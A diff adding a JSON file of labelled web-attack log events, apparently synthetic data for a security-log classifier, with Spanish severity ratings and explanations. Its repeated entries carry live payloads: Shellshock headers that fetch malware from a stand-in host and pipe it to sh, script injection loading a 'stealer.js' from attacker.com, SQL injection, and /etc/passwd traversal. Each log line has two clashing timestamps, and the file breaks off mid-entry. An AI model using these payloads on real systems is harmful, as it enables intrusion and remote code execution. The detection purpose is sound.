@@ -1,0 +1,902 @@
+[
+    {
+        "id_evento": 1,
+        "timestamp": "2026-06-10T08:51:25Z",
+        "ip_origen": "185.45.22.242",
+        "log_raw": "185.45.22.242 - - [10/Jun/2026:08:51:25 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 2,
+        "timestamp": "2026-06-10T08:51:29Z",
+        "ip_origen": "82.113.9.197",
+        "log_raw": "82.113.9.197 - - [10/Jun/2026:08:51:29 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 3,
+        "timestamp": "2026-06-10T08:51:35Z",
+        "ip_origen": "82.113.9.181",
+        "log_raw": "82.113.9.181 - - [10/Jun/2026:08:51:35 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 4,
+        "timestamp": "2026-06-10T08:51:38Z",
+        "ip_origen": "192.168.1.47",
+        "log_raw": "192.168.1.47 - - [10/Jun/2026:08:51:38 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 5,
+        "timestamp": "2026-06-10T08:51:39Z",
+        "ip_origen": "82.113.9.180",
+        "log_raw": "82.113.9.180 - - [10/Jun/2026:08:51:39 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 6,
+        "timestamp": "2026-06-10T08:51:46Z",
+        "ip_origen": "82.113.9.120",
+        "log_raw": "82.113.9.120 - - [10/Jun/2026:08:51:46 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 7,
+        "timestamp": "2026-06-10T08:51:52Z",
+        "ip_origen": "82.113.9.177",
+        "log_raw": "82.113.9.177 - - [10/Jun/2026:08:51:52 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 8,
+        "timestamp": "2026-06-10T08:51:55Z",
+        "ip_origen": "185.45.22.178",
+        "log_raw": "185.45.22.178 - - [10/Jun/2026:08:51:55 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 9,
+        "timestamp": "2026-06-10T08:51:56Z",
+        "ip_origen": "82.113.9.165",
+        "log_raw": "82.113.9.165 - - [10/Jun/2026:08:51:56 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 10,
+        "timestamp": "2026-06-10T08:52:02Z",
+        "ip_origen": "185.45.22.63",
+        "log_raw": "185.45.22.63 - - [10/Jun/2026:08:52:02 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 11,
+        "timestamp": "2026-06-10T08:52:06Z",
+        "ip_origen": "192.168.1.149",
+        "log_raw": "192.168.1.149 - - [10/Jun/2026:08:52:06 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 12,
+        "timestamp": "2026-06-10T08:52:07Z",
+        "ip_origen": "192.168.1.100",
+        "log_raw": "192.168.1.100 - - [10/Jun/2026:08:52:07 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 13,
+        "timestamp": "2026-06-10T08:52:13Z",
+        "ip_origen": "185.45.22.122",
+        "log_raw": "185.45.22.122 - - [10/Jun/2026:08:52:13 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 14,
+        "timestamp": "2026-06-10T08:52:14Z",
+        "ip_origen": "82.113.9.181",
+        "log_raw": "82.113.9.181 - - [10/Jun/2026:08:52:14 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 15,
+        "timestamp": "2026-06-10T08:52:15Z",
+        "ip_origen": "82.113.9.201",
+        "log_raw": "82.113.9.201 - - [10/Jun/2026:08:52:15 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 16,
+        "timestamp": "2026-06-10T08:52:20Z",
+        "ip_origen": "82.113.9.230",
+        "log_raw": "82.113.9.230 - - [10/Jun/2026:08:52:20 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 17,
+        "timestamp": "2026-06-10T08:52:25Z",
+        "ip_origen": "82.113.9.181",
+        "log_raw": "82.113.9.181 - - [10/Jun/2026:08:52:25 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 18,
+        "timestamp": "2026-06-10T08:52:32Z",
+        "ip_origen": "82.113.9.197",
+        "log_raw": "82.113.9.197 - - [10/Jun/2026:08:52:32 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 19,
+        "timestamp": "2026-06-10T08:52:37Z",
+        "ip_origen": "82.113.9.89",
+        "log_raw": "82.113.9.89 - - [10/Jun/2026:08:52:37 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 20,
+        "timestamp": "2026-06-10T08:52:44Z",
+        "ip_origen": "82.113.9.158",
+        "log_raw": "82.113.9.158 - - [10/Jun/2026:08:52:44 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 21,
+        "timestamp": "2026-06-10T08:52:50Z",
+        "ip_origen": "82.113.9.215",
+        "log_raw": "82.113.9.215 - - [10/Jun/2026:08:52:50 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 22,
+        "timestamp": "2026-06-10T08:52:54Z",
+        "ip_origen": "185.45.22.223",
+        "log_raw": "185.45.22.223 - - [10/Jun/2026:08:52:54 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 23,
+        "timestamp": "2026-06-10T08:52:57Z",
+        "ip_origen": "185.45.22.59",
+        "log_raw": "185.45.22.59 - - [10/Jun/2026:08:52:57 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 24,
+        "timestamp": "2026-06-10T08:52:59Z",
+        "ip_origen": "185.45.22.41",
+        "log_raw": "185.45.22.41 - - [10/Jun/2026:08:52:59 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 25,
+        "timestamp": "2026-06-10T08:53:00Z",
+        "ip_origen": "82.113.9.142",
+        "log_raw": "82.113.9.142 - - [10/Jun/2026:08:53:00 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 26,
+        "timestamp": "2026-06-10T08:53:01Z",
+        "ip_origen": "82.113.9.188",
+        "log_raw": "82.113.9.188 - - [10/Jun/2026:08:53:01 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 27,
+        "timestamp": "2026-06-10T08:53:08Z",
+        "ip_origen": "185.45.22.184",
+        "log_raw": "185.45.22.184 - - [10/Jun/2026:08:53:08 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 28,
+        "timestamp": "2026-06-10T08:53:15Z",
+        "ip_origen": "192.168.1.11",
+        "log_raw": "192.168.1.11 - - [10/Jun/2026:08:53:15 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 29,
+        "timestamp": "2026-06-10T08:53:22Z",
+        "ip_origen": "192.168.1.180",
+        "log_raw": "192.168.1.180 - - [10/Jun/2026:08:53:22 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 30,
+        "timestamp": "2026-06-10T08:53:26Z",
+        "ip_origen": "185.45.22.119",
+        "log_raw": "185.45.22.119 - - [10/Jun/2026:08:53:26 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 31,
+        "timestamp": "2026-06-10T08:53:30Z",
+        "ip_origen": "82.113.9.94",
+        "log_raw": "82.113.9.94 - - [10/Jun/2026:08:53:30 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 32,
+        "timestamp": "2026-06-10T08:53:31Z",
+        "ip_origen": "82.113.9.181",
+        "log_raw": "82.113.9.181 - - [10/Jun/2026:08:53:31 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 33,
+        "timestamp": "2026-06-10T08:53:35Z",
+        "ip_origen": "192.168.1.100",
+        "log_raw": "192.168.1.100 - - [10/Jun/2026:08:53:35 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 34,
+        "timestamp": "2026-06-10T08:53:37Z",
+        "ip_origen": "82.113.9.198",
+        "log_raw": "82.113.9.198 - - [10/Jun/2026:08:53:37 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 35,
+        "timestamp": "2026-06-10T08:53:41Z",
+        "ip_origen": "192.168.1.47",
+        "log_raw": "192.168.1.47 - - [10/Jun/2026:08:53:41 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 36,
+        "timestamp": "2026-06-10T08:53:48Z",
+        "ip_origen": "185.45.22.234",
+        "log_raw": "185.45.22.234 - - [10/Jun/2026:08:53:48 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 37,
+        "timestamp": "2026-06-10T08:53:53Z",
+        "ip_origen": "185.45.22.134",
+        "log_raw": "185.45.22.134 - - [10/Jun/2026:08:53:53 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 38,
+        "timestamp": "2026-06-10T08:53:56Z",
+        "ip_origen": "82.113.9.23",
+        "log_raw": "82.113.9.23 - - [10/Jun/2026:08:53:56 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 39,
+        "timestamp": "2026-06-10T08:54:03Z",
+        "ip_origen": "185.45.22.21",
+        "log_raw": "185.45.22.21 - - [10/Jun/2026:08:54:03 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 40,
+        "timestamp": "2026-06-10T08:54:08Z",
+        "ip_origen": "82.113.9.94",
+        "log_raw": "82.113.9.94 - - [10/Jun/2026:08:54:08 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 41,
+        "timestamp": "2026-06-10T08:54:11Z",
+        "ip_origen": "82.113.9.7",
+        "log_raw": "82.113.9.7 - - [10/Jun/2026:08:54:11 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 42,
+        "timestamp": "2026-06-10T08:54:17Z",
+        "ip_origen": "185.45.22.181",
+        "log_raw": "185.45.22.181 - - [10/Jun/2026:08:54:17 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 43,
+        "timestamp": "2026-06-10T08:54:23Z",
+        "ip_origen": "185.45.22.234",
+        "log_raw": "185.45.22.234 - - [10/Jun/2026:08:54:23 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 44,
+        "timestamp": "2026-06-10T08:54:28Z",
+        "ip_origen": "82.113.9.207",
+        "log_raw": "82.113.9.207 - - [10/Jun/2026:08:54:28 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 45,
+        "timestamp": "2026-06-10T08:54:34Z",
+        "ip_origen": "82.113.9.23",
+        "log_raw": "82.113.9.23 - - [10/Jun/2026:08:54:34 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 46,
+        "timestamp": "2026-06-10T08:54:39Z",
+        "ip_origen": "185.45.22.21",
